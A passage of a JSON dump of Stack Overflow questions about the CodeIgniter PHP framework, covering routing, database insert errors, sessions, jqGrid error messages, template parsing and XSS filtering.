[L]\n\n    RewriteCond %{HTTP_HOST} .\n\nRewriteCond %{HTTP_HOST} !^www.domain.com [NC]\n\nRewriteRule (.*) http://www.domain.com/$1 [R=301,L]\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n    # If we don't have mod_rewrite installed, all 404's\n    # can be sent to index.php, and everything works as normal.\n    # Submitted by: ElliotHaughin\n\n    ErrorDocument 404 /index.php\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Currently the URLs are showing up as <a href=\"http://www.domain.com/main/home\" rel=\"nofollow\">http://www.domain.com/main/home</a> but I would rather have it appear as <a href=\"http://www.domain.com/home\" rel=\"nofollow\">http://www.domain.com/home</a>. How can I change that?</p>\n"},{"tags":["codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13022804,"title":"CodeIgniter URI Routing is not working as expected","body":"<p>There are something in the user guide like this</p>\n\n<pre><code>(:num) will match a segment containing only numbers.\n</code></pre>\n\n<p>so I do this</p>\n\n<pre><code>//using wildcard\n$route['tool/reply/(\\d+)'] = \"tool/reply/$1\";\n//or using regx like this\n//$route['tool/reply/(:num)'] = \"tool/reply/$1\";\n</code></pre>\n\n<p>But it not only matches numeric numbers, it matches strings as well. What happened? Did I miss something?</p>\n"},{"tags":["codeigniter","activerecord","insert","foreach"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13021328,"title":"Codeigniter Error Duplicate entry '' for key 'PRIMARY' when looping insert statement","body":"<p>I'm setting this function up in codeigniter to run as a cron job and log all users out at X time. I've used this code succesfully when selecting one user and logging that user out, but when adding the foreach, I get the following error:</p>\n\n<pre><code>Error Number: 1062\n\nDuplicate entry '3858' for key 'PRIMARY'\n\nINSERT INTO `time` (`id`, `projectid`, `phaseid`, `firstname`, `timest`, `status`, `activityid`, `todate`, `remark`, `time`, `workperiod`, `activitydate`, `entrydate`) VALUES ('3858', '212132 Unilever Nigeria Â 10000L Toothpaste Storage Tanks x 2', '1', 'BONGANI', '1347610976', '1', '1', '1', '1', 3335907, 'nothing', '2012-09-14 10:22:56', '2012-10-23 01:01:23')\n\nFilename: C:\\xampp\\htdocs\\projectfiles\\protime\\v2\\system\\database\\DB_driver.php\n\nLine Number: 330\n</code></pre>\n\n<p>This is the code for the model:</p>\n\n<pre><code>function punch_out() {\n    $this -&gt; load -&gt; database();\n    $this -&gt; load -&gt; helper('date');\n    //get people\n    $this -&gt; db -&gt; select('*');\n    $this -&gt; db -&gt; from('person');\n    $this -&gt; db -&gt; order_by(\"department\", \"asc\");\n    $this -&gt; db -&gt; order_by(\"userid\", \"asc\");\n    $query = $this -&gt; db -&gt; get();\n    foreach ($query-&gt;result_array() as $row) {\n        $people[] = $row;\n\n    }\n\n    foreach ($people as $row) :\n\n    $this -&gt; db -&gt; from('punch');\n    $this -&gt; db -&gt; where('firstname', $row['firstname']);\n    $this -&gt; db -&gt; order_by(\"id\", \"desc\");\n    $this -&gt; db -&gt; limit(1);\n    $query = $this -&gt; db -&gt; get();\n    foreach ($query-&gt;result_array() as $row) {\n        $data = $row;\n    }\n\n    $data['workperiod'] = 'nothing';\n\n    $current_time = getdate();\n\n    if ($current_time['wday'] &gt; '0' &amp;&amp; $current_time['wday'] &lt; '5') {\n        if ($current_time['hours'] &gt; '7' &amp;&amp; $current_time['hours'] &lt; '12') {\n            $data['workperiod'] = 'stda';\n        } else if ($current_time['0'] &gt; strtotime('4:16am') &amp;&amp; $current_time &lt; strtotime('11:59pm')) {\n            $data['workperiod'] = 'ota';\n        }\n    } else if ($current_time['wday'] == '5') {\n        if ($current_time['0'] &gt; strtotime('7:00am') &amp;&amp; $current_time &lt; strtotime('11:59am')) {\n            $data['workperiod'] = 'stdb';\n        } else if ($current_time['0'] &gt; strtotime('1:01am') &amp;&amp; $current_time &lt; strtotime('11:59pm')) {\n            $data['workperiod'] = 'otb';\n        }\n    } else if ($current_time['wday'] == '6') {\n        $data['workperiod'] = 'otc';\n    } else if ($current_time['wday'] == '0') {\n        $data['workperiod'] = 'dtc';\n    }\n\n    if ($data['status'] == 1) {\n        //MAKE TIME\n        $now = time();\n        $data['time'] = elapsed_time($data['timest'], $now);\n        $data['entrydate'] = timestamp_to_mysqldatetime($now);\n        $data['activitydate'] = timestamp_to_mysqldatetime($data['timest']);\n        $this -&gt; db -&gt; insert('time', $data);\n    }\n\n    endforeach;\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6800,"score":0,"question_id":3019743,"title":"Debug Mode for CodeIgniter?","body":"<p>Does <a href=\"http://www.codeigniter.com/\" rel=\"nofollow\">CodeIgniter</a> provide a Debug Mode, for example, when accessing an Invalid URL?</p>\n\n<p>Ruby on Rails does show debugging Messages when a incorrect URL has been given, and the controller is unable to resolve it using the routes map. How would I enable such debugging messages in CodeIgniter?</p>\n\n<p>The profiler ...</p>\n\n<pre><code>$this-&gt;output-&gt;enable_profiler(TRUE);\n</code></pre>\n\n<p>... only affects single classes, but not all routes. So debugging without an actual debugger mode is a little... difficult. :-)</p>\n"},{"tags":["php","codeigniter","expressionengine"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":553,"score":1,"question_id":1933994,"title":"Introduction to Code Igniter and Expression Engine","body":"<p>I'm looking for an introduction in creating application using CodeIgniter and Integrating it to Expression Engine. </p>\n"},{"tags":["php","codeigniter","twitter-api"],"answer_count":0,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13019311,"title":"Elliot Haughin Codeigniter twitter library error","body":"<p>I am using Elliot Haughin's Codeigniter twitter library for my 'login with twitter' feature. I have placed all the files as described by the guide. And i haven't made any changes to it. When i run a simple login with twitter. It throws me an error, and the error comes from the library file from the api. here is a link to the original file: </p>\n\n<p><a href=\"https://github.com/elliothaughin/codeigniter-twitter/blob/master/application/libraries/tweet.php\" rel=\"nofollow\">https://github.com/elliothaughin/codeigniter-twitter/blob/master/application/libraries/tweet.php</a></p>\n\n<p>The error I am getting is :</p>\n\n<p>Undefined property: stdClass::$request, Line Number: 205</p>\n\n<p>Undefined property: stdClass::$error, Line Number: 205</p>\n\n<p>Is it a bug in the library, or what do you think the problem is? </p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["codeigniter","mysqli"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":13015168,"title":"CodeIgnitor dbcollat","body":"<p>I am using CodeIgniter with the following settings:</p>\n\n<pre><code>$db['default']['char_set'] = 'utf8'; \n$db['default']['dbcollat'] = 'utf8_general_ci';\n</code></pre>\n\n<p>My database columns and table use <code>utf8_unicode_ci</code> as the collation. Should I change how I connect?</p>\n\n<p>What potential problems are there if I don't change. The application seems to be working fine now, but I just noticed this discrepancy.</p>\n"},{"tags":["php","jquery","codeigniter","jqgrid"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":127,"score":1,"question_id":13016181,"title":"How can I add a jqGrid custom error message?","body":"<p>I´m using CodeIgniter and JQuery Grid. I have seen the responses that you have been made here about this topic but I haven't been able to solve my problem with none of them.<br>\nThe fact is that I have a jqGrid and I need to show the the dialog of insert several types of error that the database server returns.</p>\n\n<p>For example, in one case I have this error: </p>\n\n<blockquote>\n  <p>Duplicate entry '18-2-1-2012-10-25' for key 'user_store_turn_index'</p>\n</blockquote>\n\n<p>I need to get this and to show a custom message instead of the current:</p>\n\n<blockquote>\n  <p>error Status: 'Internal Server Error'. Error code: 500</p>\n</blockquote>\n\n<p>I've tried with the <code>aftersubmit</code> event. I've read the docs and seen the available examples but nothing works. </p>\n\n<p>Inside my JavaScript code I have the function that deals with the after submit event for jqGrid:</p>\n\n<pre><code>afterSubmit : function(response, postdata){ \n    test_validate\n           return false;\n    },\n}\n</code></pre>\n\n<p>Then, I write the function that should get the responses for the after submit event:</p>\n\n<pre><code>function test_validate(response,postdata) {\n    alert('test');\n    if(response.responseText == '') {\n        success = true;\n    } else {\n        success = false;\n    }\n    return [success,response.responseText]\n}\n</code></pre>\n\n<p>But nothing happens... Here is the almost complete jquery grid code </p>\n\n<pre><code>$(document).ready(function() {\n\n           var grid = jQuery(\"#newapi_1351189510\").jqGrid({\n                    ajaxGridOptions : {type:\"POST\"},\n                      jsonReader : {\n                      root:\"data\",\n                      repeatitems: false\n                   },\n                    rowList:[10,20,30],\n                    viewrecords: true\n                   ,url:'http://localhost/sp/index.php/turn_open/getData'\n,editurl:'http://localhost/sp/index.php/turn_open/setData'\n,datatype:'json'\n,rowNum:'20'\n,width:'600'\n,height:'300'\n,pager: '#pnewapi_1351189510'\n,caption:'Apertura de caja'\n,colModel:[\n{name:'username',index:'username',label:'Usuario' ,align:'center',width:180,editable:false  }\n,{name:'TurnName',index:'TurnName',label:'Turno' ,align:'center',width:180,editable:false  }\n,{name:'date',index:'date',label:'Fecha' ,width:100,editable:true,edittype:'text',editrules:{required:false,date:true}  ,editoptions: {size: 10, maxlengh: 10,dataInit: function(element) { $(element).datepicker({dateFormat: 'yy-mm-dd',changeMonth: true,changeYear: true,yearRange: '1982:2022'})}},searchoptions: {size: 10, maxlengh: 10,dataInit: function(element) { $(element).datepicker({dateFormat: 'yy-mm-dd',changeMonth: true,changeYear: true,yearRange: '1982:2022'})}}}\n\n]       })\n            jQuery(\"#newapi_1351189510\")\n            .jqGrid('navGrid',\n            '#pnewapi_1351189510',\n            {view:false,\n            edit:'1',\n            add:'1',\n            del:'1',\n            close:true,\n            delfunc: null\n        },\n         afterSubmit : function(response, postdata)\n          { test_validate\n           return false;\n         },\n        }, \n        {mtype: 'POST'} /*delete options*/,\n        ).navButtonAdd('#pnewapi_1351189510',\n                { caption:'', buttonicon:'ui-icon-extlink', onClickButton:dtgOpenExportdata, position: 'last', title:'Export data', cursor: 'pointer'}\n                );\n        ;\n\n             function test_validate(response,postdata){\n             alert('test');\n               if(response.responseText == ''){\n                 success = true;\n                }else{\n                success = false;\n                }\n                return [success,response.responseText]\n             }\n\n        });\n</code></pre>\n"},{"tags":["codeigniter","call","swfobject"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13016721,"title":"multiple calls using swf object","body":"<p>I'm presenting some swf resources on a popup (jQueryUI), using codeigniter php framework.</p>\n\n<p>The controller has this method</p>\n\n<pre><code>  $resourceData = \"&lt;data_TEMP&gt;\".\n    \"&lt;idPais&gt;\".$geral['idPais'].\"&lt;/idPais&gt;\".\n    \"&lt;Recurso&gt;\".\n        \"&lt;Id&gt;\".$id.\"&lt;/Id&gt;\".\n        \"&lt;File&gt;\".$fileURL.\"&lt;/File&gt;\".\n    \"&lt;/Recurso&gt;\".\n    \"&lt;/data_TEMP&gt;\";\n\n    $resourceJscript .= \n        \"swfobject.embedSWF(\".\n            \"'\" . WRAPER_RESOURCES_ROOT . \"', 'flashContent', '100%', '100%', '9.0.0', '\" . RESOURCES_ROOT .  \"expressInstall.swf',\".\n            \"{ Data: '\".$resourceData.\"' },\".\n            \"{ allowscriptaccess: 'always', allowfullscreen: 'true', bgcolor : '#33383f', 'wmode' : 'opaque' },\".\n            \"{ id : 'objectToLoadID' }\".\n    \");\";\n</code></pre>\n\n<p>The resource is opening correctly, but at the chrome console I see that multiple calls are being made to the file specified as the 1st parameter. Look at this screenshot. As long as I'm opening resources, the number of calls inscreases. </p>\n\n<p><img src=\"http://i.stack.imgur.com/gNSy0.png\" alt=\"enter image description here\"></p>\n\n<p>How could this be?</p>\n"},{"tags":["php","codeigniter","activerecord","datamapper"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":107,"score":0,"question_id":13015295,"title":"Codeigniter Active Record vs Datamapper","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/2169832/data-mapper-vs-active-record\">data mapper vs active record</a>  </p>\n</blockquote>\n\n\n\n<p>Sorry if it is  duplicate question. Currently I am using Codeigniter with its <b>Active    Record</b>. Everything works fine. I heard of a <b>Datamapper</b>, but I don't know if I should use it or stick with ActiveR. </p>\n\n<p>What is Datamapper is used for?\n   Whata are advantages or disadvantages?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13013712,"title":"How to use question mark and colon in an url with codeigniter?","body":"<p>I'm trying to open that url with codeigniter:</p>\n\n<p><a href=\"http://example.com/controller/function/land-for-sale-6350-m2-40k-euro-is-that-too-much-?-ad-code:608/54990\" rel=\"nofollow\">http://example.com/controller/function/land-for-sale-6350-m2-40k-euro-is-that-too-much-?-ad-code:608/54990</a></p>\n\n<p>here is the error i've got:</p>\n\n<p>Disallowed Key Characters: -ad-code:608/54990</p>\n\n<p>$config['permitted_uri_chars'] = 'a-üöçşığzA-ÜÖÇŞİĞZ\\', :/?0-9~%._+&amp;*!-';</p>\n\n<p>what to do fix that problem ?</p>\n"},{"tags":["php","codeigniter","user-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":13012688,"title":"How to verify user authentication before viewing \"View\" in CodeIgniter?","body":"<p>So I have a \"dashboard\" controller that points to the corresponding view. This file can be accessed at any time simply by going to <code>http://domain.com/dashboard</code>. However, I only want this URL to be accessed IF the user is logged in already. If not, they're redirected back to the home page.</p>\n\n<p>So TWO part question:</p>\n\n<ol>\n<li><p>How do I prevent a user from accessing the \"dashboard\" if they're not logged in first (should redirect to home page otherwise)...<strong>EDIT: THIS ISSUE HAS BEEN FIXED AND CODE UPDATED BELOW</strong></p></li>\n<li><p>On the register controller, instead of a user being directed to the <code>thank()</code> function (which brings them to a thank you for registering page), how do I log the user in automatically and take them to the dash?</p></li>\n</ol>\n\n<p>Here's my \"dashboard\" controller. <strong>Edit:</strong> Now works as it should. Second (2) issue above still remains.</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Dashboard extends CI_Controller{\n\nfunction __construct(){\n    parent::__construct();\n    $this -&gt; load -&gt; model('user_model');\n}\n\npublic function index()\npublic function index()\n{\n    $session = $this-&gt;session-&gt;userdata('logged_in');\n\n    if ($session == 1) \n    {\n        $data['title'] = 'Dashboard';\n        $this -&gt; load -&gt; view('shared/header_view', $data);\n        $this -&gt; load -&gt; view('dash', $data);\n        $this -&gt; load -&gt; view('shared/footer_view', $data);\n    }\n    else {\n        redirect('register');\n    }\n}\n}\n</code></pre>\n\n<p>Here's my registration controller that logins, logouts, and registers the user:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Register extends CI_Controller {\n\npublic function __construct() \n{\n    parent::__construct();\n    $this -&gt; load -&gt; model('user_model');\n}\n\npublic function index() \n{\n    if (($this -&gt; session -&gt; userdata('user_name') != \"\")) {\n        $this -&gt; welcome();\n    } \n    else\n    {\n        $data['title'] = 'Home';\n        $this -&gt; load -&gt; view('shared/header_view', $data);\n        $this -&gt; load -&gt; view(\"registration_view.php\", $data);\n        $this -&gt; load -&gt; view('shared/footer_view', $data);\n    }\n}\n\npublic function welcome() \n{\n     redirect('/dashboard/', 'refresh');\n}\n\npublic function login() \n{\n    $email = $this -&gt; input -&gt; post('email');\n    $password = md5($this -&gt; input -&gt; post('pass'));\n\n    $result = $this -&gt; user_model -&gt; login($email, $password);\n    if ($result)\n        $this -&gt; welcome();\n    else\n        $this -&gt; index();\n}\n\npublic function thank() \n{\n    $data['title'] = 'You are now registered!';\n    $this -&gt; load -&gt; view('shared/header_view', $data);\n    $this -&gt; load -&gt; view('thank_view.php', $data);\n    $this -&gt; load -&gt; view('shared/footer_view', $data);\n}\n\npublic function registration() \n{\n    $this -&gt; load -&gt; library('form_validation');\n    // field name, error message, validation rules\n    $this -&gt; form_validation -&gt; set_rules('user_name', 'User Name', 'trim|required|min_length[4]|xss_clean');\n    $this -&gt; form_validation -&gt; set_rules('email_address', 'Your Email', 'trim|required|valid_email');\n    $this -&gt; form_validation -&gt; set_rules('password', 'Password', 'trim|required|min_length[4]|max_length[32]');\n    $this -&gt; form_validation -&gt; set_rules('con_password', 'Password Confirmation', 'trim|required|matches[password]');\n\n    if ($this -&gt; form_validation -&gt; run() == FALSE) \n    {\n        $this -&gt; index();\n    } \n    else \n    {\n        $this -&gt; user_model -&gt; add_user();\n        $this -&gt; thank();\n    }\n}\n\npublic function logout() \n{\n    $newdata = array('user_id' =&gt; '', 'user_name' =&gt; '', 'user_email' =&gt; '', 'logged_in' =&gt; FALSE, );\n    $this -&gt; session -&gt; unset_userdata($newdata);\n    $this -&gt; session -&gt; sess_destroy();\n    redirect('/', 'refresh');\n}\n</code></pre>\n\n<p>}</p>\n\n<p>EDIT: AS Requested, here's the user_model:</p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n\nclass User_model extends CI_Model {\n\npublic function __construct() {\n    parent::__construct();\n}\n\nfunction login($email, $password) \n{\n    $this -&gt; db -&gt; where(\"email\", $email);\n    $this -&gt; db -&gt; where(\"password\", $password);\n\n    $query = $this -&gt; db -&gt; get(\"user\");\n    if ($query -&gt; num_rows() &gt; 0) \n    {\n        foreach ($query-&gt;result() as $rows) \n        {\n            //add all data to session\n            $newdata = array(\n                'user_id' =&gt; $rows -&gt; id,\n                'user_name' =&gt; $rows -&gt; username,\n                'user_email' =&gt; $rows -&gt; email,\n                'logged_in' =&gt; TRUE,\n            );\n        }\n        $this -&gt; session -&gt; set_userdata($newdata);\n        return true;\n    }\n    return false;\n}\n\npublic function add_user() \n{\n    $data = array(\n        'username' =&gt; $this -&gt; input -&gt; post('user_name'),\n        'email' =&gt; $this -&gt; input -&gt; post('email_address'),\n        'password' =&gt; md5($this -&gt; input -&gt; post('password')),\n    );\n    $this -&gt; db -&gt; insert('user', $data);\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Codeigniter newbie. What am I doing wrong? </p>\n"},{"tags":["php","validation","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13013794,"title":"Codeigniter validation_errors() always returning empty","body":"<p>I have a simple form adding to my db with the below validation rules. \"form\" is in autoload.php.</p>\n\n<p>Whenever any of the validation rules are broken the page shows no error output, when none are broken the form goes through as expected.</p>\n\n<p>here's my controller function</p>\n\n<pre><code>  public function add()\n{\n\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;library('layout');\n    // field name, error message, validation rules\n    $this-&gt;form_validation-&gt;set_rules('type', 'Type', 'required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('title_type', 'Title type', 'required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('first_name', 'First name', 'trim|required|min_length[1]|max_length[150]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('surname', 'Surname', 'trim|required|min_length[1]|max_length[150]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('job_title', 'Job title', 'trim|min_length[5]|max_length[300]required|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('office_number', 'Office number', 'trim|min_length[2]|max_length[11]|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('telephone', 'Telephone', 'trim|numeric|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'trim|valid_email|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('website', 'Website', 'trim|prep_url|xss_clean');\n    $this-&gt;form_validation-&gt;set_rules('background', 'Background', 'trim|xss_clean');\n\n\n    $data = array(\n        'title' =&gt; 'Add staff member'\n    );\n\n    if ($this-&gt;form_validation-&gt;run() == FALSE) { //Was errors\n\n        $this-&gt;session-&gt;set_flashdata('message','You missed some details, please try again.');\n\n        $this-&gt;layout-&gt;load('default', 'add_person', $data);\n    } else {\n        $this-&gt;people_model-&gt;add_person();\n        $this-&gt;layout-&gt;load('default', 'added_person', $data);\n    }\n\n\n} //add\n</code></pre>\n\n<p>And in my form view i have</p>\n\n<pre><code>    &lt;?php echo validation_errors('&lt;p class=\"msg msg-error\"&gt;') ?&gt;\n</code></pre>\n\n<p>Can anyone see what I've done wrong, I've tried everything I can think of.</p>\n\n<p>A var_dump of the validation_errors() gives</p>\n\n<pre><code>string '' (length=0)\n</code></pre>\n\n<p>edit: strangely, if i swap these two lines around, i get:</p>\n\n<pre><code>    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;load-&gt;library('layout'); //lib code http://pastebin.com/K1rBV512\n\nMessage: Undefined property: People::$form_validation\n\nFilename: controllers/people.php\n\nLine Number: 27\n</code></pre>\n"},{"tags":["arrays","codeigniter","parsing","multidimensional-array","foreach"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13013219,"title":"CodeIgniter parsing multidemensional arrays","body":"<p>In this <a href=\"http://codeigniter.com/user_guide/libraries/parser.html\" rel=\"nofollow\">http://codeigniter.com/user_guide/libraries/parser.html</a> tutorial we have this multidemensional array </p>\n\n<pre><code>$data = array(\n          'blog_title'   =&gt; 'My Blog Title',\n          'blog_heading' =&gt; 'My Blog Heading',\n          'blog_entries' =&gt; array(\n                                  array('title' =&gt; 'Title 1', 'body' =&gt; 'Body 1'),\n                                  array('title' =&gt; 'Title 2', 'body' =&gt; 'Body 2'),\n                                  array('title' =&gt; 'Title 3', 'body' =&gt; 'Body 3'),\n                                  array('title' =&gt; 'Title 4', 'body' =&gt; 'Body 4'),\n                                  array('title' =&gt; 'Title 5', 'body' =&gt; 'Body 5')\n                                  )\n        );\n</code></pre>\n\n<p>And we printing him easily like this </p>\n\n<pre><code>{blog_entries}\n    &lt;h5&gt;{title}&lt;/h5&gt;\n    &lt;p&gt;{body}&lt;/p&gt;\n{/blog_entries}\n</code></pre>\n\n<p>But how to output array like this one <a href=\"http://i.imgur.com/L6i1B.png\" rel=\"nofollow\">http://i.imgur.com/L6i1B.png</a> :?</p>\n\n<pre><code> $data = array( \narray(\n    'user' =&gt; array('id' =&gt; \"1\", 'name' =&gt; \"Test1\"\n    ),'title' =&gt; 'Title 1', 'body' =&gt; 'Body 1'),\narray(\n    'user' =&gt; array('id' =&gt; \"2\", 'name' =&gt; \"Test2\"\n    ),'title' =&gt; 'Title 2', 'body' =&gt; 'Body 2'),\narray(\n    'user' =&gt; array('id' =&gt; \"3\", 'name' =&gt; \"Test3\"\n    ),'title' =&gt; 'Title 3', 'body' =&gt; 'Body 3')\n);\n</code></pre>\n\n<p>If we trying to do something like this </p>\n\n<pre><code>{blog_entries}\n    {user}\n        {id}\n    {/user}\n    {title}\n    {body}\n    &lt;br /&gt;\n{/blog_entries}\n</code></pre>\n\n<p>We ll have error:</p>\n\n<pre><code>Message: Invalid argument supplied for foreach()\n</code></pre>\n\n<p>Ah, found similar problem here <a href=\"http://stackoverflow.com/questions/6619523/extended-template-parser-codeigniter-issue-with-nested-arrays\">Extended Template Parser: CodeIgniter... Issue with Nested Arrays</a></p>\n"},{"tags":["php","database","codeigniter","session"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":26,"score":1,"question_id":13013744,"title":"Codeigniter - session db or session cookies benchmarking","body":"<p>Hello i would like to know if using the codeigniter session with db is slower than using simple cookies session.</p>\n\n<p>Specifically i would like from some of you to specify which is the work flow of the session using db and the workflow of the session using cookies.</p>\n\n<p>Details are important , really thanks!</p>\n"},{"tags":["php","codeigniter","session","size"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":42,"score":-1,"question_id":13013196,"title":"Codeigniter session and size limit with no DB","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4431250/size-of-session-in-codeigniter\">size of session in codeigniter</a>  </p>\n</blockquote>\n\n\n\n<p>Is here any size limit for session userdata when NOT using db for session data?</p>\n\n<p>On my site everytime user votes a comment the id of the comment voted, is stored in user's session array, what if user votes 1bilion comments? </p>\n\n<p>In this case do you suggest to use db session storage?</p>\n"},{"tags":["css","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3442,"score":4,"question_id":2213112,"title":"Codeigniter: unable to link the referencing css file","body":"<p>I am just starting out with Codeigniter. \nI have referenced the css file in the corresponding views file but it fails to link. This is the code I have used to reference the css file. </p>\n\n<pre><code>&lt;link rel=\"stylesheet\" href=\"&lt;?php echo base_url();?&gt;css/style.css\" type=\"text/css\" media=\"screen\"/&gt;\n</code></pre>\n\n<p>I tested the css code by inserting it between  &amp;  and it works. Just can't get the linking to work.</p>\n"},{"tags":["php","codeigniter","mongodb"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13005866,"title":"add library path in .htaccess file codeigniter","body":"<p>I am working on project with Codeigniter and MongoDB.\nAs there are no cheap hosting for MongoDB, i am using <a href=\"https://mongolab.com/\" rel=\"nofollow\">MongoLab</a> where i am getting free MongoDB space and i hosted the project on other server. MongoLab Provides connection string to database with a port so right now i am connecting the MongoDB from my localhost with threadsafe <code>.dll</code> file and for that i have made changes <code>php.ini</code>.</p>\n\n<p>As i hosted on shared server, when i contacted the customer support, they said that we can add library via <code>.htaccess</code> file as well.</p>\n\n<p>I googled a lot but i have no luck with it.</p>\n\n<p>So my question is pretty simple, How to add the library with <code>.htaccess</code> file so that i will out the library in folder and register it in <code>.htaccess</code> file?</p>\n"},{"tags":["php","arrays","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":13009641,"title":"populating on the basis of array elements in php","body":"<p>This is my code.</p>\n\n<pre><code>        if(in_array(\"1\", $mod)){ \n        $res=array('First Name','Insertion','Last Name','Lead Country');}\n\n       if(in_array(\"2\", $mod)){ \n        $res=array('Landline No:','Mobile No:','Lead Country');}\n\n        if(in_array(\"3\", $mod)){ \n        $res=array('City','State','Country','Lead Country');}\n\n        if(in_array(\"4\", $mod)){ \n        $res=array('Email','Lead Country');}\n\n        return $res;\n</code></pre>\n\n<p>Upto this it works fine. But if the array contains more than one value say (1,3)\nI need to return both results of 1 and 3.</p>\n\n<p>eg: if the array is like this</p>\n\n<pre><code>    array([0]=&gt;1 [1]=&gt;3)\n</code></pre>\n\n<p>then</p>\n\n<pre><code>    $res=array('First Name','Insertion','Last Name','City','State','Country','Lead Country') \n</code></pre>\n\n<p>But if there are 2 lead country only one should be displayed how to do this?\nPls help me.</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":8156655,"title":"CodeIgniter 2 Call autoloaded model","body":"<p>This is probably a newb question but how do I call a model that has been auto loaded?</p>\n\n<p>I had:</p>\n\n<pre><code>$this-&gt;load-&gt;model('Test'); \n$data['members'] = $this-&gt;Test-&gt;get_members();\n</code></pre>\n\n<p>But now I don't need to load it since it's auto loaded. I'm getting this error: </p>\n\n<pre><code>Undefined property: Members::$Test\n</code></pre>\n"},{"tags":["codeigniter","parsing","if-statement"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13008019,"title":"CodeIgniter parser addon","body":"<p>Can't load my_parser class.\nAdded this <a href=\"http://codepad.org/QtHsyRN3\" rel=\"nofollow\">http://codepad.org/QtHsyRN3</a> to application/libraries\nthan in controller i wrote </p>\n\n<pre><code>$this-&gt;load-&gt;library('my_parser');\n</code></pre>\n\n<p>but i am getting </p>\n\n<pre><code>Unable to load the requested class: my_parser\n</code></pre>\n\n<p>What can be? I need something like this</p>\n\n<pre><code>{if 10 &gt; 8}10 is greater then 8&lt;br /&gt;{/if}\n</code></pre>\n\n<p>But without smarty and etc.</p>\n"},{"tags":["php","codeigniter","xss","user-input","input-validation"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12995934,"title":"Codeigniter removes inline style from html input","body":"<p>Taking a look at the following code:</p>\n\n<pre><code>$this-&gt;input-&gt;post('title', FALSE);\n</code></pre>\n\n<p>I have manually disabled XSS filtering.</p>\n\n<p>Now lets see some examples:</p>\n\n<pre><code>&lt;p BAD_ATTR_KEY=\"BAD_ATTR_VAL\"&gt;Salam&lt;/span&gt;\n</code></pre>\n\n<p>RETURNS:</p>\n\n<pre><code>&lt;p BAD_ATTR_KEY=\"BAD_ATTR_VAL\"&gt;Salam&lt;/span&gt;\n</code></pre>\n\n<hr>\n\n<pre><code>&lt;p style=\"color: red;\"&gt;Salam&lt;/span&gt;\n</code></pre>\n\n<p>RETURNS:</p>\n\n<pre><code>&lt;p  red;\"&gt;Salam&lt;/span&gt;\n</code></pre>\n\n<p>Any ideas how to disable this behavior so that the site admins will be able to easily assign different inline styles to any element on the page?</p>\n\n<hr>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>I have enabled global XSS filtering in <code>application/config/config.php</code> because I need it all the time.</p>\n\n<p>I don't need XSS filtering only when trusted admins are posting their content from back end. For that purpose I have manually disabled XSS filtering as mentioned in my code above. And I think that the manual config should override default config estated at <code>config.php</code>, so there should be no problem with that.</p>\n"},{"tags":["javascript","codeigniter","attributes","tinymce","strip-tags"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12992367,"title":"TinyMCE strips inline style with valid-elements: *[*]","body":"<p>I have read <a 